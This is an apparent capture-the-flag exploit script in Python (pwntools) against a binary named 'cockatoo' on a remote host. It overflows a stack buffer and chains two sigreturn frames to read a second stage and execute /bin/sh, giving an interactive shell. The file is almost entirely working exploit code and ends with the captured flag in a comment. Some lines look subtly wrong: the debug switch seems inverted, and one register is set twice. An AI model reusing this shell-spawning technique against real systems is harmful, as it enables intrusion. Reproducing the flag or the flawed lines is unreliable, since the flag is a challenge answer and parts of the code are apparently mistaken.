#!/usr/bin/env python3
import struct

from pwn import *


def connect():
    if args.LOCAL:
        if args.GDB:
            return process(["./cockatoo"])
        else:
            tube = gdb.debug(["./cockatoo"], api=True)
            tube.gdb.execute("b *0x40120A")  # return from main()
            tube.gdb.continue_nowait()
            return tube
    else:
        return remote("18.203.110.195", 31623)


# &buf == rbp - 0x110
# &cookie == rbp - 0x8
# &ret == rbp + 0x8
RET_OFF = 0x18
SYSCALL = 0x401A8B
POP_RAX = 0x401001
SCRATCH = 0x403000  # rw page
__NR_read = 0
__NR_sigreturn = 15
__NR_execve = 59
STDIN_FILENO = 0


def main():
    with connect() as tube:
        # (2)
        buf2 = b"/bin/sh\0"
        assert len(buf2) == 0x8
        buf2 += struct.pack("<QQ", SCRATCH, 0)
        buf2 += b"".join((
            struct.pack("<QQQ", POP_RAX, __NR_sigreturn, SYSCALL),
        ))
        frame2 = SigreturnFrame(arch="amd64")
        frame2.rax = __NR_execve
        frame2.rdi = SCRATCH  # path
        frame2.rsi = SCRATCH + 8  # argv
        frame2.rsi = SCRATCH + 0x10  # envp
        frame2.rip = SYSCALL
        buf2 += bytes(frame2)

        # (1)
        buf1 = flat({
            0x100: bytes((RET_OFF - 1,)),
        })
        buf1 += struct.pack("<QQQ", POP_RAX, __NR_sigreturn, SYSCALL)
        frame1 = SigreturnFrame(arch="amd64")
        frame1.rax = __NR_read
        frame1.rdi = STDIN_FILENO
        frame1.rsi = SCRATCH
        frame1.rdx = len(buf2)
        frame1.rsp = SCRATCH + 0x18  # buf2 rop
        frame1.rip = SYSCALL
        buf1 += bytes(frame1)

        tube.send(buf1 + b"\n" + buf2)

        tube.interactive()  # BHFlagY{8d633295310d30c07d699522fbdd740c}


if __name__ == "__main__":
    main()
